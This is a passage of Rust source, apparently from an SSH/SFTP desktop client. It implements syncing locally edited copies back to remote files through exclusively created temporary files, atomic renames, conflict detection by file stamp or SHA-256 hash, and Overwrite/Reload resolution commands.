    /// so a change made right after it is still noticed).
    stamp: RemoteStamp,
}

/// Upload an edited local file over `target` without ever truncating the live
/// remote file: the bytes go to a temporary file next to it, are checked, and
/// only then renamed into place. The old code opened `target` itself with
/// CREATE|TRUNCATE and never closed it, so a connection drop mid-sync left a
/// TRUNCATED remote file while the editor showed a saved one.
///
/// The temporary name is `<target>.sshspan-tmp-<random>` - fresh for every
/// save, so nothing can be planted for it - and it is created EXCLUSIVELY: it
/// used to be the fixed `<target>.sshspan-tmp`, opened with CREATE|TRUNCATE,
/// so a link planted there by another user of a shared folder was written
/// THROUGH (into its target), a planted file was truncated, and the rename
/// then deleted the real file and put the link in its place (F1).
///
/// On any failure before the swap the temporary file this call created is
/// removed (if the server refuses even that, the error says where the
/// leftover is) and the original is untouched; if the swap itself fails the
/// error says where the new content is. `mode` (the permission bits the
/// remote file had when it was opened) is put back on the new file - a
/// rename replaces the inode, and an executable script must stay executable.
///
/// `tmp` is the temporary name to use - fresh from [`edit_temp_name`]: the
/// edit session picks it, so it knows which file a failed swap left (see
/// [`EditSync::upload`]).
async fn upload_edited_file_as(
    sftp: &russh_sftp::client::SftpSession,
    local: &std::path::Path,
    target: &str,
    mode: Option<u32>,
    tmp: &str,
) -> Result<EditUpload, String> {
    use russh_sftp::protocol::OpenFlags;
    use tokio::io::AsyncWriteExt;

    let lf = tokio::fs::File::open(local)
        .await
        .map_err(|e| format!("could not read the saved file: {e}"))?;
    let tmp = tmp.to_string();
    // EXCLUSIVE: an existing name is never truncated or written through, and
    // it is not ours - it is never removed either.
    let mut rf = match sftp
        .open_with_flags(
            &tmp,
            OpenFlags::CREATE | OpenFlags::EXCLUDE | OpenFlags::WRITE,
        )
        .await
    {
        Ok(rf) => rf,
        Err(_) if sftp.symlink_metadata(&tmp).await.is_ok() => {
            return Err(format!(
                "A temporary file is in the way: {tmp} already exists on the server. Nothing \
                 was changed - move or delete it, then save again."
            ))
        }
        Err(e) => return Err(format!("could not create {tmp}: {}", sftp_error_detail(e))),
    };

    // Stage a COMPLETE copy.
    let staged: Result<u64, String> = async {
        let copied = tokio::io::copy_buf(
            &mut tokio::io::BufReader::with_capacity(256 * 1024, lf),
            &mut rf,
        )
        .await
        .map_err(|e| format!("upload failed: {e}"))?;
        // `copy` returning Ok only means the writes were QUEUED: russh-sftp
        // reports a rejected write when the pending acknowledgements are
        // drained (flush) and the CLOSE status on shutdown - the old code did
        // neither, so a failed write looked like success.
        rf.flush()
            .await
            .map_err(|e| format!("upload failed: {e}"))?;
        rf.shutdown()
            .await
            .map_err(|e| format!("upload did not finish cleanly: {e}"))?;
        Ok(copied)
    }
    .await;
    // An error in copy or flush exits BEFORE shutdown sent CLOSE; close that
    // handle and wait for its response before deleting the temp file. On
    // Win32-OpenSSH it cannot be deleted while our handle is open. (`File`'s
    // Drop only queues a CLOSE without awaiting it.) A second CLOSE when the
    // error came after shutdown is harmless and is answered as "unknown
    // handle" - the first CLOSE already released it.
    if staged.is_err() {
        if let Err(e) = rf.close().await {
            // `close` consumes the handle: if a pending write acknowledgement
            // made shutdown fail before CLOSE, its Drop queues the CLOSE
            // before the REMOVE below (requests on a channel are ordered).
            log::debug!("[sshspan-sftp] close of failed edit temp {tmp}: {e}");
        }
    } else {
        drop(rf);
    }
    let copied = match staged {
        Ok(copied) => copied,
        Err(e) => {
            // Nothing replaced anything yet: delete the partial copy. If even
            // that is refused, say where the leftover is instead of leaving it
            // on the server unannounced.
            return Err(match remove_edit_temp(sftp, &tmp).await {
                Ok(()) => e,
                Err(rm) => format!("{e} (temp file left at {tmp}: {})", sftp_error_detail(rm)),
            });
        }
    };
    // Prove it is whole - and still the regular file this call wrote: LSTAT,
    // never STAT (which follows a link swapped in after the CLOSE). A file
    // that is no longer ours is left alone.
    let written = regular_file_attrs(sftp, &tmp, Some(copied))
        .await
        .map_err(|why| format!("{why}, so {target} was not replaced"))?;
    // A server that reports no size cannot be checked here; the flush and
    // the CLOSE above already confirmed every write.
    if written.size.is_some_and(|size| size != copied) {
        let short = format!(
            "{tmp} holds {} of {copied} bytes",
            written.size.unwrap_or_default()
        );
        return Err(match remove_edit_temp(sftp, &tmp).await {
            Ok(()) => short,
            Err(rm) => format!(
                "{short} (temp file left at {tmp}: {})",
                sftp_error_detail(rm)
            ),
        });
    }

    if let Some(mode) = mode {
        let attrs = russh_sftp::protocol::FileAttributes {
            permissions: Some(mode),
            ..Default::default()
        };
        if let Err(e) = sftp.set_metadata(&tmp, attrs).await {
            // Best effort: some servers refuse SETSTAT. The edit still goes in.
            log::warn!("[sshspan-sftp] could not restore mode {mode:o} on {tmp}: {e}");
        }
    }
    // The swap. If it fails the new content is complete at `tmp` (and the
    // original may be gone if only the second half of the retry failed), so
    // the temp file is KEPT and the message says where it is.
    crate::sftp::queue::rename_over(sftp, &tmp, target, Some(copied))
        .await
        .map_err(|d| format!("could not replace {target}: {d} (the saved content is at {tmp})"))?;
    Ok(EditUpload {
        bytes: copied,
        stamp: RemoteStamp::of(&written),
    })
}

/// [`upload_edited_file_as`] with a fresh temporary name.
#[cfg(all(test, unix))]
async fn upload_edited_file(
    sftp: &russh_sftp::client::SftpSession,
    local: &std::path::Path,
    target: &str,
    mode: Option<u32>,
) -> Result<EditUpload, String> {
    upload_edited_file_as(sftp, local, target, mode, &edit_temp_name(target)).await
}

/// A fresh name for an edit upload's temporary file next to `target`.
fn edit_temp_name(target: &str) -> String {
    format!(
        "{target}{EDIT_TMP_SUFFIX}-{}",
        uuid::Uuid::new_v4().simple()
    )
}

/// Delete an edit upload's temporary remote file AFTER its handle is closed.
/// One short retry if the v3 status could mean a Windows sharing violation:
/// OpenSSH maps EACCES to PermissionDenied and other errors to Failure; v3
/// does not carry the underlying Win32 error number. A permanent refusal is
/// still reported with the leftover's path.
async fn remove_edit_temp(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
) -> Result<(), russh_sftp::client::error::Error> {
    use russh_sftp::protocol::StatusCode;
    match sftp.remove_file(path).await {
        Err(e) if sftp_status(&e, &[StatusCode::PermissionDenied, StatusCode::Failure]) => {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            sftp.remove_file(path).await
        }
        other => other,
    }
}

/// One live edit session: the staged copy, the remote file it syncs back to,
/// and what the session knows about both.
pub(crate) struct EditSync {
    sftp: Arc<russh_sftp::client::SftpSession>,
    session_id: String,
    /// The renderer's handle on this session (events, `sftp_edit_resolve`).
    edit_id: String,
    /// The path the user opened: what events and the registry are keyed by.
    remote: String,
    /// What is actually written: `remote` with symbolic links resolved, so
    /// editing through a link updates the file it points at instead of
    /// replacing the link with a regular file.
    target: String,
    /// The local copy the editor works on.
    staged: Arc<crate::sftp::StagedCopy>,
    /// The remote file's permission bits when it was opened.
    mode: Option<u32>,
    emit: Arc<dyn Fn(serde_json::Value) + Send + Sync>,
    stopped: std::sync::atomic::AtomicBool,
    debounce: EditDebounce,
    /// Sync-backs and resolutions of one file never overlap: two writers on
    /// the same temporary path would interleave.
    upload_lock: tokio::sync::Mutex<()>,
    /// The remote file as of the last time this session agreed with it.
    baseline: std::sync::Mutex<RemoteStamp>,
    /// SHA-256 of the content the server holds as far as this session knows
    /// (`None`: unknown, so the next save uploads).
    synced: std::sync::Mutex<Option<String>>,
    /// The conflict reported to the user and not resolved yet.
    pending: std::sync::Mutex<Option<PendingConflict>>,
    /// Sync-backs that did not go through (see [`Self::on_change`]).
    retry: SyncRetry,
}

impl EditSync {
    pub(crate) fn edit_id(&self) -> &str {
        &self.edit_id
    }

    /// The edit ended (closed, session gone, vault locked): no more uploads,
    /// and the staged copy is discarded.
    pub(crate) fn end(&self) {
        self.stopped.store(true, Ordering::SeqCst);
        self.staged.discard();
    }

    fn is_stopped(&self) -> bool {
        self.stopped.load(Ordering::SeqCst)
    }

    /// The file name the user sees in messages.
    fn display_name(&self) -> &str {
        self.remote.rsplit('/').next().unwrap_or(&self.remote)
    }

    fn report(&self, outcome: &SyncOutcome) {
        (self.emit)(edit_sync_event(
            &self.session_id,
            &self.edit_id,
            &self.remote,
            outcome,
        ));
    }

    /// React to what the watcher saw. A rescan (the watcher's queue
    /// overflowed and events were lost - notify 7 reports that as an event
    /// with the Rescan flag, not as an error) is handled like a save: the
    /// staged file is hashed and compared with what the server holds, so a
    /// save lost in the overflow still syncs, and nothing is sent when
    /// nothing changed.
    async fn react(self: Arc<Self>, verdict: WatchVerdict) {
        match verdict {
            WatchVerdict::Save => {
                // A save always gets an attempt (see `on_change`).
                self.retry.save_seen.store(true, Ordering::SeqCst);
                self.on_change().await
            }
            WatchVerdict::Rescan => self.on_change().await,
            WatchVerdict::Unrelated => {}
        }
    }

    /// A change to the staged file was seen (or a rescan asked for a look):
    /// once the burst settles, sync it once and report the outcome (success
    /// AND failure). Nothing is sent when the file holds what the server
    /// already has (an unchanged save, the rewrite a Reload makes, a rescan
    /// with nothing new). Nothing is sent over a remote change made since the
    /// session last agreed with the server, or over a file deleted there: that
    /// is held back as a conflict for the user to settle
    /// ([`sftp_edit_resolve`]) - and a check that fails is an error, never a
    /// blind upload.
    ///
    /// Accepted race: the remote file is checked and THEN uploaded, so a
    /// change that lands in the one round trip between the two is
    /// overwritten (SFTP v3 has no conditional write).
    ///
    /// A sync that fails is reported once. A rescan (the periodic check, or
    /// a watcher overflow) tries only content that has been neither synced
    /// nor tried: it used to retry a failing save every half minute, with an
    /// error event each time - and, when the swap was refused, another full
    /// temporary copy on the server each time. A save the watcher saw always
    /// gets its attempt (and its event).
    async fn on_change(self: Arc<Self>) {
        let Some(generation) = self.debounce.settle().await else {
            return; // a newer change will upload
        };
        if self.is_stopped() {
            return;
        }
        let _turn = self.upload_lock.lock().await;
        // The previous upload may have been running while newer saves queued
        // up behind it; only the newest still has work to do.
        if !self.debounce.is_current(generation) || self.is_stopped() {
            return;
        }
        let Some(_open) = self.staged.open_handle() else {
            return;
        };
        let saved = self.retry.save_seen.swap(false, Ordering::SeqCst);
        let local_hash = match sha256_file(self.staged.path()).await {
            Ok(hash) => hash,
            Err(e) => {
                let why = format!("could not read the saved file: {e}");
                return self.failed(saved, None, why);
            }
        };
        if self.synced.lock().unwrap().as_deref() == Some(local_hash.as_str()) {
            return;
        }
        if !saved && self.already_failed(&local_hash) {
            return;
        }
        match self.check_remote().await {
            Check::Agrees => {}
            Check::Failed(why) => return self.failed(saved, Some(local_hash), why),
            Check::Differs(differs) => {
                log::info!(
                    "[sshspan-sftp] {} {} on the server since it was opened on {}; not syncing",
                    self.remote,
                    differs.reason.as_str(),
                    self.session_id
                );
                if let Some(conflict) = self.hold_back(differs, &local_hash) {
                    self.report(&SyncOutcome::Conflict {
                        name: self.display_name().to_string(),
                        conflict,
                    });
                }
                return;
            }
        }
        match self.upload(local_hash.clone()).await {
            Ok(()) => self.report(&SyncOutcome::Uploaded),
            Err(e) => self.failed(saved, Some(local_hash), e),
        }
    }

    /// Whether `local_hash` is the content of the last failed attempt.
    fn already_failed(&self, local_hash: &str) -> bool {
        self.retry
            .failure
            .lock()
            .unwrap()
            .as_ref()
            .is_some_and(|f| f.local.as_deref() == Some(local_hash))
    }

    /// A sync-back that did not go through: remembered, and reported -
    /// unless a rescan met exactly the failure already reported. A save the
    /// watcher saw (`saved`) always reports.
    fn failed(&self, saved: bool, local: Option<String>, error: String) {
        let failure = FailedSync { local, error };
        let repeat = {
            let mut last = self.retry.failure.lock().unwrap();
            let repeat = last.as_ref() == Some(&failure);
            *last = Some(failure.clone());
            repeat
        };
        if saved || !repeat {
            self.report(&SyncOutcome::Failed(failure.error));
        }
    }

    /// The remote file as it is now.
    async fn remote_now(&self) -> RemoteNow {
        use russh_sftp::protocol::StatusCode;
        match self.sftp.metadata(&self.target).await {
            Ok(md) => RemoteNow::Present(RemoteStamp::of(&md)),
            Err(e) if sftp_status(&e, &[StatusCode::NoSuchFile]) => RemoteNow::Deleted,
            Err(e) => RemoteNow::Failed(sftp_error_detail(e)),
        }
    }

    /// How the remote file compares with what the session last agreed with.
    /// A server that reports neither size nor time is compared by content
    /// (SHA-256, up to [`EDIT_COMPARE_MAX_BYTES`]; a larger file cannot be
    /// compared and is a conflict the user settles).
    async fn check_remote(&self) -> Check {
        let name = self.display_name();
        let now = match self.remote_now().await {
            RemoteNow::Present(now) => now,
            RemoteNow::Deleted => {
                return Check::Differs(Differs {
                    reason: ConflictReason::Deleted,
                    remote: RemoteStamp::default(),
                    remote_sha256: None,
                })
            }
            RemoteNow::Failed(why) => {
                return Check::Failed(format!(
                    "Could not check {name} on the server before syncing ({why}), so your save \
                     was not uploaded. Save again to retry."
                ))
            }
        };
        if now.size.is_some() || now.mtime.is_some() {
            return if now == *self.baseline.lock().unwrap() {
                Check::Agrees
            } else {
                Check::Differs(Differs {
                    reason: ConflictReason::Changed,
                    remote: now,
                    remote_sha256: None,
                })
            };
        }
        let synced = self.synced.lock().unwrap().clone();
        match remote_sha256_capped(&self.sftp, &self.target, EDIT_COMPARE_MAX_BYTES).await {
            Ok(Some(hash)) if synced.as_deref() == Some(hash.as_str()) => Check::Agrees,
            Ok(hash) => Check::Differs(Differs {
                reason: if hash.is_some() && synced.is_some() {
                    ConflictReason::Changed
                } else {
                    ConflictReason::Unverifiable
                },
                remote: now,
                remote_sha256: hash,
            }),
            Err(why) => Check::Failed(format!(
                "Could not compare {name} with the server before syncing ({why}), so your save \
                 was not uploaded. Save again to retry."
            )),
        }
    }

    /// Whether the remote file changed again since `pending` was reported -
    /// neither as reported nor back to what the session last agreed with -
    /// and how (the fresh conflict). Compared by size and time, or by content
    /// on a server that reports neither (the re-check used to compare the
    /// empty size and time, so an Overwrite went over a second change).
    async fn changed_since(&self, pending: &PendingConflict) -> Result<Option<Differs>, String> {
        let baseline = *self.baseline.lock().unwrap();
        let changed = |reason, remote, remote_sha256| {
            Some(Differs {
                reason,
                remote,
                remote_sha256,
            })
        };
        Ok(match self.remote_now().await {
            RemoteNow::Failed(why) => return Err(why),
            RemoteNow::Deleted if pending.reason == ConflictReason::Deleted => None,
            RemoteNow::Deleted => changed(ConflictReason::Deleted, RemoteStamp::default(), None),
            RemoteNow::Present(now) if pending.reason == ConflictReason::Deleted => {
                changed(ConflictReason::Changed, now, None)
            }
            RemoteNow::Present(now) if now.size.is_none() && now.mtime.is_none() => {
                let hash =
                    remote_sha256_capped(&self.sftp, &self.target, EDIT_COMPARE_MAX_BYTES).await?;
                let synced = self.synced.lock().unwrap().clone();
                if hash == pending.remote_sha256 || (hash.is_some() && hash == synced) {
                    None
                } else if hash.is_some() {
                    changed(ConflictReason::Changed, now, hash)
                } else {
                    changed(ConflictReason::Unverifiable, now, None)
                }
            }
            RemoteNow::Present(now) if now == pending.remote || now == baseline => None,
            RemoteNow::Present(now) => changed(ConflictReason::Changed, now, None),
        })
    }

    /// Record a conflict as the pending one - keeping its id while the remote
    /// file stays as reported - and return it for an event; `None` when
    /// exactly this was already reported for this local content (a periodic
    /// rescan must not repeat the same message every half minute).
    fn hold_back(&self, differs: Differs, local_hash: &str) -> Option<PendingConflict> {
        let mut pending = self.pending.lock().unwrap();
        if let Some(p) = pending.as_mut() {
            if p.reason == differs.reason
                && p.remote == differs.remote
                && p.remote_sha256 == differs.remote_sha256
            {
                if p.local == local_hash {
                    return None;
                }
                p.local = local_hash.to_string();
                return Some(p.clone());
            }
        }
        let conflict = PendingConflict {
            id: uuid::Uuid::new_v4().to_string(),
            reason: differs.reason,
            remote: differs.remote,
            remote_sha256: differs.remote_sha256,
            local: local_hash.to_string(),
        };
        *pending = Some(conflict.clone());
        Some(conflict)
    }

    /// Upload the staged copy (whose content hashes to `local_hash`) over the
    /// remote file; the result becomes what the session agrees with (the new
    /// file's stamp as seen just before it was renamed into place) and any
    /// pending conflict or failure is settled. A temporary file an earlier
    /// failed swap left is removed first, so an edit never leaves more than
    /// one, and one this attempt leaves is remembered. The caller holds
    /// `upload_lock` and a handle on the staged copy.
    async fn upload(&self, local_hash: String) -> Result<(), String> {
        self.remove_kept_temp().await?;
        let tmp = edit_temp_name(&self.target);
        let result = upload_edited_file_as(
            &self.sftp,
            self.staged.path(),
            &self.target,
            self.mode,
            &tmp,
        )
        .await;
        match result {
            Ok(up) => {
                log::info!(
                    "[sshspan-sftp] synced back {} ({} bytes) on {}",
                    self.remote,
                    up.bytes,
                    self.session_id
                );
                *self.baseline.lock().unwrap() = up.stamp;
                *self.synced.lock().unwrap() = Some(local_hash);
                *self.pending.lock().unwrap() = None;
                *self.retry.failure.lock().unwrap() = None;
                Ok(())
            }
            Err(e) => {
                log::warn!(
                    "[sshspan-sftp] sync of {} on {} failed: {e}",
                    self.remote,
                    self.session_id
                );
                // A failed swap keeps the new content at `tmp` (so does a
                // cleanup the server refused).
                if self.sftp.symlink_metadata(&tmp).await.is_ok() {
                    *self.retry.kept_temp.lock().unwrap() = Some(tmp);
                }
                Err(e)
            }
        }
    }

    /// Remove the temporary file a failed swap left, if there is one. If the
    /// server refuses, nothing is uploaded: that would leave a second one.
    async fn remove_kept_temp(&self) -> Result<(), String> {
        use russh_sftp::protocol::StatusCode;
        let kept = self.retry.kept_temp.lock().unwrap().clone();
        let Some(tmp) = kept else {
            return Ok(());
        };
        match remove_edit_temp(&self.sftp, &tmp).await {
            Ok(()) => {}
            Err(e) if sftp_status(&e, &[StatusCode::NoSuchFile]) => {}
            Err(e) => {
                return Err(format!(
                    "The temporary file the last attempt left, {tmp}, could not be removed ({}), \
                     so nothing was uploaded - remove it, then save again.",
                    sftp_error_detail(e)
                ))
            }
        }
        *self.retry.kept_temp.lock().unwrap() = None;
        Ok(())
    }

    /// Carry out what the user chose for the PENDING conflict `conflict_id`:
    /// upload the local copy over the server's version, or replace the local
    /// copy with it. Either way the session then agrees with the server again
    /// and the conflict is settled. A resolve with no conflict pending, or for
    /// a conflict a newer one replaced, is refused. Overwrite first checks the
    /// server again: if the file is no longer as the conflict reported it
    /// (someone saved again meanwhile), nothing is uploaded - a FRESH conflict
    /// is reported and returned instead. A success is also reported as an
    /// `sftp-edit-sync` event; a failure only as the error.
    async fn resolve(
        self: Arc<Self>,
        conflict_id: &str,
        action: EditResolution,
    ) -> Result<serde_json::Value, String> {
        use russh_sftp::protocol::StatusCode;
        let _turn = self.upload_lock.lock().await;
        if self.is_stopped() {
            return Err(EDIT_SESSION_ENDED.to_string());
        }
        let Some(_open) = self.staged.open_handle() else {
            return Err(EDIT_SESSION_ENDED.to_string());
        };
        let pending = match self.pending.lock().unwrap().clone() {
            None => return Err("There is no conflict to resolve for this file.".to_string()),
            Some(p) if p.id != conflict_id => {
                return Err(
                    "That conflict was replaced by a newer one - choose again on the \
                     newest message."
                        .to_string(),
                )
            }
            Some(p) => p,
        };
        let name = self.display_name().to_string();
        let (action_name, outcome) = match action {
            EditResolution::Overwrite => {
                let local_hash = sha256_file(self.staged.path())
                    .await
                    .map_err(|e| format!("Could not read your copy of {name}: {e}"))?;
                let fresh = self.changed_since(&pending).await.map_err(|why| {
                    format!("Could not check {name} on the server ({why}); nothing was uploaded.")
                })?;
                if let Some(differs) = fresh {
                    let conflict = self
                        .hold_back(differs, &local_hash)
                        .unwrap_or_else(|| pending.clone());
                    let outcome = SyncOutcome::Conflict {
                        name: name.clone(),
                        conflict,
                    };
                    self.report(&outcome);
                    return Ok(edit_sync_event(
                        &self.session_id,
                        &self.edit_id,
                        &self.remote,
                        &outcome,
                    ));
                }
                self.upload(local_hash).await?;
                ("overwrite", SyncOutcome::Uploaded)
            }
            EditResolution::Reload => {
                if let Err(e) = self.sftp.metadata(&self.target).await {
                    return Err(if sftp_status(&e, &[StatusCode::NoSuchFile]) {
                        format!(
                            "{name} was deleted on the server, so there is nothing to reload - \
                             choose Overwrite to put your copy back."
                        )
                    } else {
                        format!(
                            "Could not read {name} on the server: {}",
                            sftp_error_detail(e)
                        )
                    });
                }
                let local = self.staged.path().display().to_string();
                let downloaded = download_to_hashed(&self.sftp, &self.target, &local)
                    .await
                    .map_err(|e| e.0)?;
                #[cfg(test)]
                tests::run_reload_hook(&self.edit_id);
                // The STAT the download was based on (taken before its first
                // read) and the hash of the bytes it WROTE - not of the file
                // as it is now: an editor save landing right after the rename
                // must still count as a change to upload.
                *self.baseline.lock().unwrap() = downloaded.stamp;
                *self.synced.lock().unwrap() = Some(downloaded.sha256);
                *self.pending.lock().unwrap() = None;
                *self.retry.failure.lock().unwrap() = None;
                ("reload", SyncOutcome::Reloaded)
            }
        };
        self.report(&outcome);
        let stamp = *self.baseline.lock().unwrap();
        Ok(serde_json::json!({
            "ok": true,
            "editId": self.edit_id,
            "action": action_name,
            "remoteSize": stamp.size,
            "remoteModifiedMs": stamp.mtime.map(|s| i64::from(s) * 1000),
        }))
    }
}

/// Download a remote file to a temp location, start watching it, and hand the
/// path back with the session's `editId`. The renderer opens it with the
/// system default app (opener); on every local save the watcher syncs it back
/// to the remote path and reports the outcome with an `sftp-edit-sync` event
/// (success AND failure - a failed sync used to be swallowed, leaving the
/// editor showing a saved file whose upload never landed).
///
/// A save does not overwrite a remote change made since the download (or the
/// last sync-back): the remote file's size and modification time are compared
/// first, and a difference - or the file deleted on the server - is reported
/// as a conflict (`conflict: true`, with a `conflictId`) for the user to
/// settle with [`sftp_edit_resolve`] - Overwrite or Reload. The check and the
/// upload are two steps: a change landing in the one round trip between them
/// is overwritten (accepted - SFTP v3 has no conditional write).
///
/// Opening a file that is already open for editing in this session returns
/// that edit (same `editId` and local copy, `reused: true`) instead of
/// starting a second one.
#[tauri::command]
pub async fn sftp_open_for_edit(
    app: AppHandle,
    session_id: String,
    remote: String,
) -> CmdResult<serde_json::Value> {
    use tauri::Emitter;
    let sftp = sftp_from_session(&app, &session_id)?;
    let app_for_events = app.clone();
    let emit: Arc<dyn Fn(serde_json::Value) + Send + Sync> = Arc::new(move |payload| {
        let _ = app_for_events.emit("sftp-edit-sync", payload);
    });
    open_for_edit_in(
        &app.state::<EditRegistry>(),
        sftp,
        session_id,
        remote,
        edit_temp_dir(),
        emit,
    )
    .await
}

/// [`sftp_open_for_edit`] without the `AppHandle`: the registry, the
/// session's SFTP channel, the folder to stage in and where events go.
async fn open_for_edit_in(
    edit_registry: &EditRegistry,
    sftp: Arc<russh_sftp::client::SftpSession>,
    session_id: String,
    remote: String,
    temp_dir: PathBuf,
    emit: Arc<dyn Fn(serde_json::Value) + Send + Sync>,
) -> CmdResult<serde_json::Value> {
    let file_name = remote.rsplit('/').next().unwrap_or("file").to_string();
    if file_name.is_empty() {
        return Err(CmdError("Cannot edit a directory path.".into()));
    }
    let key = format!("{session_id}:{remote}");
    if let Some(open) = edit_registry
        .live_for_key(&key)
        .filter(|open| edit_is_usable(open))
    {
        return Ok(reused_edit(&open, &remote));
    }
    // Best-effort prune of staged copies left behind by crashed/killed
    // sessions (only files directly inside sshspan-edit, older than a day).
    crate::sftp::prune_stale_stage_files(&temp_dir, STAGE_FILE_MAX_AGE);
    // Unpredictable staged name: the file can hold secret remote contents,
    // so its path must not be guessable by other local users (the dir is
    // 0700, this is defense in depth for the pre-existing-dir case).
    let local = edit_stage_path(
        &temp_dir,
        &session_id,
        &file_name,
        &SensitiveLocations::current(),
    )
    .map_err(CmdError)?;

    let StagedEdit {
        baseline,
        mode,
        target,
        synced,
    } = stage_for_edit(&sftp, &remote, &local)
        .await
        .map_err(CmdError)?;
    let local_str = local.display().to_string();

    let edit_id = uuid::Uuid::new_v4().to_string();
    let sync = Arc::new(EditSync {
        sftp: sftp.clone(),
        session_id: session_id.clone(),
        edit_id: edit_id.clone(),
        remote: remote.clone(),
        target,
        staged: crate::sftp::StagedCopy::new(local.clone()),
        mode,
        emit,
        stopped: std::sync::atomic::AtomicBool::new(false),
        debounce: EditDebounce::new(EDIT_DEBOUNCE),
        upload_lock: tokio::sync::Mutex::new(()),
        baseline: std::sync::Mutex::new(baseline),
        synced: std::sync::Mutex::new(synced),
        pending: std::sync::Mutex::new(None),
        retry: SyncRetry::default(),
    });
    let watcher = match edit_watcher(&sync, &local) {
        Ok(watcher) => watcher,
        Err(e) => {
            sync.end();
            return Err(e);
        }
    };

    // Two opens of one file can race through the download: the first to get
    // here keeps its session and the other caller gets that one (its own
    // copy is deleted). The second used to end the first after its caller
    // had handed the first copy to an editor - whose saves then went nowhere.
    // An earlier edit that is no longer usable (its copy is gone) is ended.
    let watch = EditWatch {
        session_id,
        watcher: Some(watcher),
        sync: sync.clone(),
    };
    if let Err(open) = edit_registry.insert_unless_live(key, watch, edit_is_usable) {
        return Ok(reused_edit(&open, &remote));
    }
    tauri::async_runtime::spawn(periodic_rescan(Arc::downgrade(&sync), EDIT_RESCAN_EVERY));

    Ok(serde_json::json!({
        "ok": true, "localPath": local_str, "remote": remote, "editId": edit_id,
    }))
}

/// Whether an open edit can be handed to another open of the same file: not
/// ended, and its staged copy still there.
fn edit_is_usable(open: &EditSync) -> bool {
    !open.is_stopped() && open.staged.path().exists()
}

/// The `sftp_open_for_edit` result for an edit that was already open.
fn reused_edit(open: &EditSync, remote: &str) -> serde_json::Value {
    serde_json::json!({
        "ok": true,
        "localPath": open.staged.path().display().to_string(),
        "remote": remote,
        "editId": open.edit_id,
        "reused": true,
    })
}

/// The file watcher of an edit: a save of the staged copy (or a rescan the
/// watcher asks for) reaches `sync`.
fn edit_watcher(
    sync: &Arc<EditSync>,
    local: &std::path::Path,
) -> CmdResult<notify::RecommendedWatcher> {
    let staged_name = local
        .file_name()
        .map(|n| n.to_os_string())
        .unwrap_or_default();
    let sync_for_watch = sync.clone();
    let mut watcher =
        notify::recommended_watcher(move |res: Result<notify::Event, notify::Error>| {
            if sync_for_watch.is_stopped() {
                return;
            }
            let verdict = match watch_verdict(res, &staged_name) {
                Ok(WatchVerdict::Unrelated) => return,
                Ok(verdict) => verdict,
                Err(e) => {
                    // Not a save, but not to be hidden either: a watcher that
                    // has died would otherwise look like "no saves happened".
                    log::warn!(
                        "[sshspan-sftp] file watcher error while editing {} on {}: {e}",
                        sync_for_watch.remote,
                        sync_for_watch.session_id
                    );
                    return;
                }
            };
            // The staged file deliberately stays for the life of the edit
            // session: deleting a path a third-party editor may hold open
            // makes editors recreate an empty/stale buffer on the next save -
            // clobbering the remote file. Cleanup happens on session close,
            // vault lock/teardown (EditRegistry::stop*), explicit
            // sftp_close_edit, or the 24h stale prune.
            let sync = sync_for_watch.clone();
            tauri::async_runtime::spawn(sync.react(verdict));
        })
        .map_err(|e| CmdError(e.to_string()))?;

    // Watch the staging DIRECTORY (see `is_edit_trigger`): a watch on the file
    // itself dies with the inode when an editor saves by renaming over it.
    let watch_dir = local
        .parent()
        .ok_or_else(|| CmdError("Staged file has no directory.".into()))?;
    watcher
        .watch(watch_dir, notify::RecursiveMode::NonRecursive)
        .map_err(|e| CmdError(e.to_string()))?;
    Ok(watcher)
}

/// Settle a conflict an `sftp-edit-sync` event reported (`conflict: true`):
/// `action` "overwrite" uploads the local copy over the server's version,
/// "reload" replaces the local copy with the server's version. Either way the
/// session then agrees with the server again (a new baseline). `conflict_id`
/// is the event's `conflictId`: only the newest pending conflict of the
/// session can be settled, and when the server changed again since that
/// event, nothing is uploaded and the result is a fresh conflict event (see
/// [`EditSync::resolve`]).
#[tauri::command]
pub async fn sftp_edit_resolve(
    app: AppHandle,
    edit_id: String,
    conflict_id: String,
    action: String,
) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    let action = EditResolution::parse(&action).map_err(CmdError)?;
    let sync = app
        .state::<EditRegistry>()
        .find(&edit_id)
        .ok_or_else(|| CmdError(EDIT_SESSION_ENDED.into()))?;
    sync.resolve(&conflict_id, action).await.map_err(CmdError)
}

/// What opening a remote file for editing staged locally.
struct StagedEdit {
    /// The remote file as of the download: what later saves are compared with.
    baseline: RemoteStamp,
    /// Its permission bits, put back on the file a save replaces.
    mode: Option<u32>,
    /// The path a save writes: `remote` with symbolic links resolved.
    target: String,
    /// SHA-256 of what was downloaded (the content the server holds).
    synced: Option<String>,
}

/// Download `remote` into `local` for editing and record what the session
/// needs to know about it. Everything comes from the download itself: the
/// mode bits a save must put back (a rename gives the new file a fresh
/// inode), the baseline a save is compared with (the STAT the download was
/// based on, taken BEFORE its first read - it used to be a separate STAT
/// whose failure was swallowed, leaving no baseline), and the SHA-256 of the
/// bytes it wrote. The path a save writes is `remote` with symbolic links
/// resolved, so editing through a link updates the file it points at.
async fn stage_for_edit(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
    local: &std::path::Path,
) -> Result<StagedEdit, String> {
    let target = sftp
        .canonicalize(remote)
        .await
        .unwrap_or_else(|_| remote.to_string());
    let downloaded = download_to_hashed(sftp, remote, &local.display().to_string())
        .await
        .map_err(|e| e.0)?;
    Ok(StagedEdit {
        baseline: downloaded.stamp,
        mode: downloaded.mode,
        target,
        synced: Some(downloaded.sha256),
    })
}

/// How often an open edit looks at its staged copy again on its own.
const EDIT_RESCAN_EVERY: std::time::Duration = std::time::Duration::from_secs(30);

/// Look at the staged copy again every `every` while the edit is open, as if
/// the watcher had asked for a rescan: the copy is hashed and compared with
/// what the server holds (cheap - nothing is sent when nothing changed). This
/// is what catches a save whose watcher events were lost on Windows, where
/// notify's backend reports no overflow (on Linux and macOS the overflow
/// itself triggers the same rescan). A rescan tries only content that has
/// been neither synced nor tried (see [`EditSync::on_change`]). Ends with the
/// edit - and holds it only weakly between looks, so an ended edit does not
/// keep its SFTP session alive until the next one.
async fn periodic_rescan(sync: std::sync::Weak<EditSync>, every: std::time::Duration) {
    loop {
        tokio::time::sleep(every).await;
        let Some(sync) = sync.upgrade() else {
            return;
        };
        if sync.is_stopped() {
            return;
        }
        sync.react(WatchVerdict::Rescan).await;
    }
}

/// Stop the edit watch for a (session, remote path) pair and discard the
/// staged copy.
#[tauri::command]
